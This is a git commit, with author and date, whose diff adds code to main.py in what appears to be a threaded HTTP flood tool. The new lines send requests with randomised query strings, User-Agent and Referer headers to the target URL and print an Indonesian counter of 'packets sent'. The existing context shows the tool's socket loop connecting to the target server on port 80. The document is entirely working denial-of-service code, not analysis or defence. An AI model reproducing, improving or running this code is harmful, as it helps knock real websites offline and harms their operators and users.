c422cb9acce525ea3f2e4b28aa5e3053f5d56a91
Kafulkaff99 <kafulkaff02@gmail.com>
2024-11-09 02:26:31 +0700

    Update main.py

--- main.py
+++ main.py
@@ -83,7 +83,12 @@ class MyThread(Thread,):
             try:
                 s.connect((server, 80))
                 s.send(request)
-
+                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
+                randomized_url = url + "?" + genstr(random.randint(3, 10))
+                requests.get(randomized_url, headers=headers)
+                u += 1
+                print("\033[92m[\033[97m+\033[92m]\033[92mNOZZ: " +str(u)+ " \033[96mMENGIRIMKAN PAKET ke" +str()+ " \033[97m" +url+ "\033[0m" )
+    
                 for c in newrequest:
                     sys.stdout.write( s.send(c).__str__() )
                     time.sleep(60)
